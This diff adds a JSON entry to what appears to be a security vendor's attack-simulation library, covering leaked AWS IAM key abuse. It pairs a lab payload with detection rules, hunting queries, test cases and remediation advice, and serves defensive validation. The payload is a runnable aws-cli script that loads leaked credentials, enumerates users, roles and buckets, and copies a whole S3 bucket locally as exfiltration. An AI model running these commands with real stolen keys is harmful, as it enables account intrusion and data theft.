@@ -1,0 +1,362 @@
+{
+  "id": "TTP-2026-0003",
+  "schema_version": "1.0.0",
+  "entry_version": "1.0.0",
+  "status": "active",
+
+  "metadata": {
+    "created_at": "2026-05-13T00:00:00Z",
+    "updated_at": "2026-05-13T00:00:00Z",
+    "authors": [
+      { "name": "Henry Reed", "email": "hreed@paloaltonetworks.com", "role": "author" }
+    ],
+    "tags": [
+      "vector-leaked-credentials",
+      "vector-iam-abuse",
+      "industry-all",
+      "severity-critical",
+      "cloud",
+      "aws"
+    ],
+    "source_refs": ["SRC-UNIT42", "SRC-MITRE-ATTACK", "SRC-STRATUS-RED-TEAM"],
+    "pov_engine": {
+      "engine_version_min": "0.1.0",
+      "auto_load": true,
+      "simulation_class": "cloud",
+      "destructive": false,
+      "requires_network_egress": true,
+      "requires_internet": true,
+      "platforms": ["aws"],
+      "estimated_runtime_seconds": 300,
+      "cleanup_required": true,
+      "safety_class": "destructive-with-cleanup"
+    }
+  },
+
+  "identity": {
+    "name": "AWS IAM Access Key Abuse — Discovery + S3 Object Exfiltration",
+    "summary": "An attacker obtains a long-lived AWS IAM access key (via leaked .env file, exposed CI artifact, or developer endpoint compromise), enumerates the account from an attacker-controlled host using GetCallerIdentity, ListBuckets, and ListUsers, then exfiltrates S3 objects via GetObject from an unusual source IP and user-agent.",
+    "description": "Per Unit 42's 2025 Cloud Threat Research, IAM-centric techniques drive the majority of cloud incident investigations, and CSP-managed policies grant ~2.5× more permissions than customer-managed ones. This simulation reproduces the canonical 'leaked key → enumerate → exfil' chain that maps to the Cortex Cloud / CDR detection narrative: surface non-human identity behaving like a human, anomalous enumeration burst, and bulk object reads from outside the expected AWS service principal.",
+    "severity": "critical",
+    "confidence": "high"
+  },
+
+  "threat_context": {
+    "actors": [
+      {
+        "name": "Opportunistic credential abusers (TeamTNT, Scarlet Eel, automated scanners)",
+        "aliases": []
+      }
+    ],
+    "campaigns": ["Generic IAM exposure exploitation"],
+    "malware_families": [],
+    "industries_targeted": ["technology", "financial-services", "healthcare", "all"],
+    "first_observed": "2017-01-01"
+  },
+
+  "mitre_attack": {
+    "matrix": "cloud",
+    "techniques": [
+      {
+        "technique_id": "T1078",
+        "subtechnique_id": "T1078.004",
+        "name": "Valid Accounts: Cloud Accounts",
+        "tactic_ids": ["TA0001", "TA0003", "TA0004", "TA0005"],
+        "tactic_names": ["Initial Access", "Persistence", "Privilege Escalation", "Defense Evasion"]
+      },
+      {
+        "technique_id": "T1580",
+        "name": "Cloud Infrastructure Discovery",
+        "tactic_ids": ["TA0007"],
+        "tactic_names": ["Discovery"]
+      },
+      {
+        "technique_id": "T1530",
+        "name": "Data from Cloud Storage",
+        "tactic_ids": ["TA0009"],
+        "tactic_names": ["Collection"]
+      },
+      {
+        "technique_id": "T1567",
+        "subtechnique_id": "T1567.002",
+        "name": "Exfiltration Over Web Service: Exfiltration to Cloud Storage",
+        "tactic_ids": ["TA0010"],
+        "tactic_names": ["Exfiltration"]
+      }
+    ],
+    "kill_chain_phase": "actions-on-objectives",
+    "data_sources": [
+      "Cloud Service: Cloud Service Metadata",
+      "User Account: User Account Authentication",
+      "Logon Session: Logon Session Creation",
+      "Cloud Storage: Cloud Storage Access"
+    ]
+  },
+
+  "execution": {
+    "target_platform": "aws",
+    "execution_framework": "stratus-red-team",
+    "framework_reference_id": "aws.credential-access.ec2-get-password-data + aws.discovery.* + aws.exfiltration.s3-bucket-public",
+    "privilege_required": "cloud-iam-user",
+    "prerequisites": [
+      {
+        "description": "Lab AWS account with a sandboxed IAM user that has read-only S3 + IAM ListUsers permissions.",
+        "check_command": "aws sts get-caller-identity --profile pov-lab",
+        "remediation": "Provision the lab IAM user via the bundled Terraform module (terraform/aws-lab/iam-victim/)."
+      },
+      {
+        "description": "Lab S3 bucket with marker objects.",
+        "check_command": "aws s3 ls s3://${LAB_BUCKET} --profile pov-lab"
+      }
+    ],
+    "payload": {
+      "interpreter": "aws-cli",
+      "code": "# Stage 1 — Discovery burst from attacker host.\nexport AWS_ACCESS_KEY_ID=${LEAKED_KEY_ID}\nexport AWS_SECRET_ACCESS_KEY=${LEAKED_KEY_SECRET}\nexport AWS_DEFAULT_REGION=${LAB_REGION}\n\naws sts get-caller-identity\naws iam list-users\naws iam list-roles\naws iam list-attached-user-policies --user-name $(aws sts get-caller-identity --query 'Arn' --output text | awk -F/ '{print $NF}')\naws s3api list-buckets\naws ec2 describe-instances --region ${LAB_REGION}\n\n# Stage 2 — Object enumeration on target bucket.\naws s3 ls s3://${LAB_BUCKET} --recursive\n\n# Stage 3 — Bulk object pull (exfil pattern).\nmkdir -p /tmp/pov-exfil-${POV_RUN_ID}\naws s3 cp s3://${LAB_BUCKET} /tmp/pov-exfil-${POV_RUN_ID}/ --recursive --quiet\nls -la /tmp/pov-exfil-${POV_RUN_ID}/ | wc -l",
+      "input_variables": [
+        { "name": "LEAKED_KEY_ID", "type": "secret", "description": "Lab IAM user access key ID." },
+        { "name": "LEAKED_KEY_SECRET", "type": "secret", "description": "Lab IAM user secret access key." },
+        { "name": "LAB_REGION", "type": "string", "default": "us-east-1" },
+        { "name": "LAB_BUCKET", "type": "string", "description": "Lab S3 bucket name pre-populated with marker objects." },
+        { "name": "POV_RUN_ID", "type": "string", "description": "Per-run unique ID for cleanup." }
+      ],
+      "timeout_seconds": 300
+    },
+    "expected_artifacts": [
+      { "artifact_type": "cloud-api-call", "description": "Rapid sequence of CloudTrail events: GetCallerIdentity → ListUsers → ListRoles → ListBuckets from a new sourceIPAddress.", "expected_value": "eventName in (GetCallerIdentity, ListUsers, ListRoles, ListBuckets) within 60s" },
+      { "artifact_type": "cloud-api-call", "description": "S3 ListObjects + bulk GetObject calls on the target bucket.", "expected_value": "eventName in (ListObjects, GetObject) AND requestParameters.bucketName = LAB_BUCKET" },
+      { "artifact_type": "cloud-api-call", "description": "Non-AWS-service userAgent (e.g., aws-cli/2.x rather than Lambda/EC2 service principal) used by an IAM user not historically tied to that workload." }
+    ],
+    "cleanup": {
+      "interpreter": "bash",
+      "code": "rm -rf /tmp/pov-exfil-${POV_RUN_ID}\nunset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY",
+      "manual_steps": [
+        "Rotate the lab access key after each POV run via `aws iam create-access-key` + delete prior.",
+        "Confirm no marker objects were modified (GetObject is read-only; nothing else should have changed)."
+      ]
+    }
+  },
+
+  "detections": {
+    "iocs": [],
+    "biocs": [
+      {
+        "name": "IAM User Discovery Burst From New Source IP",
+        "description": "≥4 distinct AWS Discovery API calls (GetCallerIdentity, ListUsers, ListRoles, ListBuckets, DescribeInstances) within 60 seconds from a sourceIPAddress and userAgent combination not previously observed for that IAM user.",
+        "logic": "dataset = cloud_audit_logs\n| filter cloud_provider = \"AWS\" and event_source in (\"sts.amazonaws.com\", \"iam.amazonaws.com\", \"s3.amazonaws.com\", \"ec2.amazonaws.com\")\n| filter event_name in (\"GetCallerIdentity\",\"ListUsers\",\"ListRoles\",\"ListBuckets\",\"DescribeInstances\",\"ListAttachedUserPolicies\")\n| bin _time span=60s\n| comp count_distinct(event_name) as distinct_calls by user_identity.arn, source_ip, user_agent, _time\n| filter distinct_calls >= 4 and source_ip not in user_baseline.recent_ips[user_identity.arn]",
+        "severity": "high",
+        "mitre_technique_ids": ["T1580", "T1078.004"]
+      },
+      {
+        "name": "S3 Bulk Object Download by IAM User With No Prior Read Pattern",
+        "description": "An IAM user (not a service role) issues ≥50 GetObject calls against a single bucket within 5 minutes, when historical baseline shows <5/day.",
+        "logic": "dataset = cloud_audit_logs\n| filter cloud_provider = \"AWS\" and event_source = \"s3.amazonaws.com\" and event_name = \"GetObject\"\n| filter user_identity.type = \"IAMUser\"\n| bin _time span=5m\n| comp count() as get_count by user_identity.arn, request_parameters.bucketName, _time\n| filter get_count >= 50 and get_count > 10 * baseline.daily_avg[user_identity.arn, request_parameters.bucketName]",
+        "severity": "critical",
+        "mitre_technique_ids": ["T1530", "T1567.002"]
+      },
+      {
+        "name": "Long-Lived IAM User Key Used From Outside Known ASN",
+        "description": "Access key auth observed from an ASN never seen for this identity in 90 days.",
+        "logic": "dataset = cloud_audit_logs\n| filter cloud_provider = \"AWS\" and additional_event_data.MFAUsed = \"No\"\n| filter user_identity.type = \"IAMUser\"\n| enrich asn = geoip(source_ip).asn\n| filter asn not in user_baseline.asns_90d[user_identity.arn]",
+        "severity": "high",
+        "mitre_technique_ids": ["T1078.004"]
+      }
+    ],
+    "xql_queries": [
+      {
+        "purpose": "validation",
+        "name": "Confirm discovery burst within last 30 min",
+        "query": "dataset = cloud_audit_logs\n| filter _time > to_timestamp(current_time() - 1800)\n| filter cloud_provider = \"AWS\" and event_name in (\"GetCallerIdentity\",\"ListUsers\",\"ListRoles\",\"ListBuckets\")\n| fields _time, user_identity.arn, source_ip, user_agent, event_name\n| sort _time desc",
+        "expected_rows_min": 4,
+        "dataset": "cloud_audit_logs"
+      },
+      {
+        "purpose": "validation",
+        "name": "Confirm S3 GetObject burst on target bucket",
+        "query": "dataset = cloud_audit_logs\n| filter _time > to_timestamp(current_time() - 1800)\n| filter event_name = \"GetObject\" and request_parameters.bucketName = \"${LAB_BUCKET}\"\n| comp count() as gets by user_identity.arn, source_ip",
+        "expected_rows_min": 1,
+        "dataset": "cloud_audit_logs"
+      },
+      {
+        "purpose": "hunt",
+        "name": "Find IAM users with both discovery burst and large S3 read within 1h",
+        "query": "dataset = cloud_audit_logs\n| filter cloud_provider = \"AWS\"\n| join (filter event_name in (\"ListUsers\",\"ListBuckets\")) as disc on user_identity.arn within 1h\n| join (filter event_name = \"GetObject\" | comp count() by user_identity.arn | filter count > 50) as exfil on user_identity.arn within 1h"
+      }
+    ],
+    "correlation_rules": [
+      {
+        "name": "Cloud — IAM Key Compromise With Exfiltration",
+        "rule_id": "CR-CLOUD-0001",
+        "logic": "BIOC(IAM User Discovery Burst From New Source IP) AND BIOC(S3 Bulk Object Download by IAM User With No Prior Read Pattern) within 60m"
+      }
+    ],
+    "analytics_modules": [
+      "Cortex Cloud — Identity Threat Detection (ITDR)",
+      "Cortex Cloud — Anomalous API Volume",
+      "Cortex CDR — Data Exfiltration Detection"
+    ]
+  },
+
+  "panw_mapping": {
+    "products": [
+      {
+        "module": "cortex-cloud",
+        "submodule": "itdr",
+        "coverage_tier": "detection",
+        "rule_ids": ["CLOUD-ITDR-IAM-001", "CLOUD-ITDR-IAM-003"],
+        "license_required": "enterprise",
+        "evidence_query": "preset:cloud_identity | filter alert_name contains \"IAM\""
+      },
+      {
+        "module": "cortex-cdr",
+        "coverage_tier": "detection",
+        "rule_ids": ["CDR-EXFIL-S3-001"],
+        "license_required": "advanced",
+        "evidence_query": "preset:cloud_exfiltration | filter resource_type = \"S3_BUCKET\""
+      },
+      {
+        "module": "prisma-cloud",
+        "submodule": "cloud-posture",
+        "coverage_tier": "exposure-mgmt",
+        "rule_ids": ["PC-IAM-OverPriv-001", "PC-IAM-KeyAge-90d"],
+        "license_required": "enterprise",
+        "evidence_query": "Compliance: IAM least-privilege findings on the simulated user."
+      },
+      {
+        "module": "cortex-asm",
+        "coverage_tier": "exposure-mgmt",
+        "rule_ids": ["ASM-LEAKED-KEY-001"],
+        "license_required": "enterprise",
+        "evidence_query": "ASM: surface leaked-credential indicator if the access key matches a known exposure."
+      },
+      {
+        "module": "cortex-xsiam",
+        "submodule": "analytics",
+        "coverage_tier": "detection",
+        "rule_ids": ["XSIAM-AN-CLOUD-IAM-001"],
+        "license_required": "advanced"
+      },
+      {
+        "module": "cortex-xsoar",
+        "coverage_tier": "response",
+        "rule_ids": ["XSOAR-PB-CloudIAMKeyCompromise-v2"],
+        "license_required": "base",
+        "evidence_query": "Playbook: Cloud IAM Key Compromise — disable key, rotate, notify owner, snapshot CloudTrail window for forensics."
+      }
+    ],
+    "use_cases": [
+      {
+        "use_case_id": "UC-CLOUD-001",
+        "name": "Leaked Cloud Credentials → Data Exfiltration Defense",
+        "description": "Detect and contain abuse of long-lived IAM access keys that surface outside their expected operating envelope, before bulk data egress completes.",
+        "test_cases": [
+          {
+            "test_case_id": "TC-CLOUD-001A",
+            "objective": "Cortex Cloud ITDR raises an incident on the discovery burst within 10 minutes of CloudTrail event ingestion.",
+            "preconditions": [
+              "AWS CloudTrail forwarding to Cortex Cloud is configured.",
+              "ITDR module licensed and enabled.",
+              "Baseline of ≥30 days of CloudTrail data for the lab account."
+            ],
+            "steps": [
+              "Run TTP-2026-0003 payload Stage 1 (discovery burst).",
+              "Wait up to 10 minutes for ingestion + analytics.",
+              "Observe Cortex Cloud Incidents."
+            ],
+            "success_criteria": [
+              "Incident `CLOUD-ITDR-IAM-001` created with severity High.",
+              "Incident timeline includes the GetCallerIdentity/ListUsers/ListBuckets sequence.",
+              "Source IP + user-agent flagged as `new for identity`."
+            ],
+            "expected_score_weight": 0.4
+          },
+          {
+            "test_case_id": "TC-CLOUD-001B",
+            "objective": "CDR detects the S3 bulk-read exfiltration pattern.",
+            "steps": [
+              "Run TTP-2026-0003 payload Stage 2 and 3.",
+              "Confirm CDR alert."
+            ],
+            "success_criteria": [
+              "CDR alert `CDR-EXFIL-S3-001` raised with severity Critical.",
+              "Volume metric (object count + bytes) matches `aws s3 cp --recursive` summary.",
+              "Correlation rule `CR-CLOUD-0001` links discovery + exfil into one incident."
+            ],
+            "expected_score_weight": 0.4
+          },
+          {
+            "test_case_id": "TC-CLOUD-001C",
+            "objective": "Prisma Cloud + ASM pre-existing posture findings reinforce the narrative.",
+            "success_criteria": [
+              "Prisma Cloud `PC-IAM-KeyAge-90d` flagged the lab access key as over-aged.",
+              "If ASM is enabled and the key was seeded into a public test repo, ASM `ASM-LEAKED-KEY-001` surfaced it."
+            ],
+            "expected_score_weight": 0.1
+          },
+          {
+            "test_case_id": "TC-CLOUD-001D",
+            "objective": "XSOAR automated response disables the compromised key.",
+            "success_criteria": [
+              "Playbook `XSOAR-PB-CloudIAMKeyCompromise-v2` invoked.",
+              "Access key set to `Inactive` via IAM API within 5 minutes.",
+              "Slack/Teams notification posted to cloud-security channel."
+            ],
+            "expected_score_weight": 0.1
+          }
+        ]
+      }
+    ]
+  },
+
+  "remediation_guidance": {
+    "preventive_controls": [
+      "Eliminate long-lived IAM access keys in favor of short-lived STS sessions via IAM Identity Center / OIDC federation.",
+      "Enforce MFA on all IAM users; require MFA condition keys on sensitive S3 actions.",
+      "Apply S3 bucket policies that deny `*:GetObject` from non-VPC endpoints.",
+      "Use SCPs to deny IAM user creation in workload accounts; centralize identity."
+    ],
+    "detection_engineering": [
+      "Baseline each IAM principal's source IP/ASN, user-agent, and API call cadence; alert on first-seen combinations.",
+      "Alert on GetObject volume anomalies per (principal, bucket) pair.",
+      "Hunt for IAM users authenticating without MFA from new ASNs."
+    ],
+    "response_playbook": "XSOAR-PB-CloudIAMKeyCompromise-v2"
+  },
+
+  "references": [
+    {
+      "title": "IAM Your Defense Against Cloud Threats: Unit 42 Cloud Threat Research",
+      "url": "https://unit42.paloaltonetworks.com/iam-cloud-threat-research/",
+      "publisher": "Unit 42",
+      "publisher_id": "SRC-UNIT42",
+      "primary": true
+    },
+    {
+      "title": "Cloud Threats on the Rise: Alert Trends Show Intensified Attacker Focus on IAM, Exfiltration",
+      "url": "https://unit42.paloaltonetworks.com/2025-cloud-security-alert-trends/",
+      "publisher": "Unit 42",
+      "publisher_id": "SRC-UNIT42"
+    },
+    {
+      "title": "Responding to Cloud Incidents — 2025 Unit 42 Global IR Report",
+      "url": "https://unit42.paloaltonetworks.com/responding-to-cloud-incidents/",
+      "publisher": "Unit 42",
+      "publisher_id": "SRC-UNIT42"
+    },
+    {
+      "title": "Stratus Red Team — AWS Attack Techniques",
+      "url": "https://stratus-red-team.cloud/attack-techniques/AWS/",
+      "publisher": "DataDog",
+      "publisher_id": "SRC-STRATUS-RED-TEAM"
+    },
+    {
+      "title": "MITRE ATT&CK T1530 — Data from Cloud Storage",
+      "url": "https://attack.mitre.org/techniques/T1530/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    }
+  ],
+
+  "changelog": [
+    { "entry_version": "1.0.0", "date": "2026-05-13", "author": "Henry Reed", "change": "Initial entry — schema validation example." }
+  ]
+}
